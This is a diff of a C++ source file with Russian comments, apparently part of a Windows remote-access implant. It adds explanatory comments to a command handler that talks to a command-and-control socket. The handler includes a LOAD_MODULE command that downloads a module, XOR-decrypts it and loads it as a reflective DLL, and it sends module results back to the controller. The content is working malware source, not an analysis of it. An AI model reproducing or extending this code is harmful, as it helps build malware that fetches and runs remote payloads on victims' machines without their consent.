@@ -1,4 +1,3 @@
-// Core/commands.cpp — исправленная версия с использованием push_to_send_queue
 #include "commands.h"
 #include "loader.h"
 #include "network.h"
@@ -9,19 +8,25 @@
 #include <queue>
 #include <map>
 
-extern SOCKET g_c2_socket;
+extern SOCKET g_c2_socket; // объявлена в нетворке
 
+//У нас есть несколько потоков: основной поток принимает команды и кладёт их в очередь,
+//а потоки модулей забирают команды из очереди. 
+//Чтобы они не мешали друг другу (не портили данные), мы используем критическую секцию
 static CRITICAL_SECTION g_module_cmd_cs;
-static std::map<std::string, std::queue<std::string>> g_module_commands;
+
+static std::map<std::string, std::queue<std::string>> g_module_commands; // очередь команд для модуля
 
 static void init_module_commands() { InitializeCriticalSection(&g_module_cmd_cs); }
 
+// кладёт команду в очередь модуля
 static void push_module_command(const std::string& module, const std::string& cmd) {
     EnterCriticalSection(&g_module_cmd_cs);
     g_module_commands[module].push(cmd);
     LeaveCriticalSection(&g_module_cmd_cs);
 }
 
+// МОдули вызывают, чтобы получить следующую команду для своей очереди
 static const char* module_get_command(const char* module_name) {
     static char result[1024] = {0};
     EnterCriticalSection(&g_module_cmd_cs);
@@ -37,6 +42,7 @@ static const char* module_get_command(const char* module_name) {
     return "";
 }
 
+// Далее идут две функции, которые передаются модулям в структуре модулапи
 static void module_log(const char* msg) {
     OutputDebugStringA("[MODULE] ");
     OutputDebugStringA(msg);
@@ -49,6 +55,7 @@ static void module_send_result(const unsigned char* data, unsigned long long len
     push_to_send_queue(buf, 1);
 }
 
+//Принимает строку команды и возвращает строку с результатом
 std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     static bool cmds_inited = false;
     if (!cmds_inited) { init_module_commands(); cmds_inited = true; }
@@ -58,7 +65,7 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
         std::string module_name = cmd.substr(12);
         std::vector<uint8_t> dll_data;
-        if (!download_module(module_name, dll_data)) return "MODULE_DOWNLOAD_FAILED";
+        if (!download_module(module_name, dll_data)) return "MODULE_DOWNLOAD_FAILED"; //лоадер
         xor_decrypt(dll_data);
         void* modbase = nullptr;
         if (!load_reflective_dll(dll_data, modbase)) return "MODULE_LOAD_FAILED";
@@ -104,7 +111,7 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     return "UNKNOWN_COMMAND";
 }
 
-void process_command(const std::string& cmd, SOCKET sock) {
+void process_command(const std::string& cmd, SOCKET sock) { // Нетворк
     std::string res = execute_builtin_command(cmd, sock);
     if (!res.empty()) {
         // Отправляем результат как бинарное сообщение (UTF-8 + '\n')
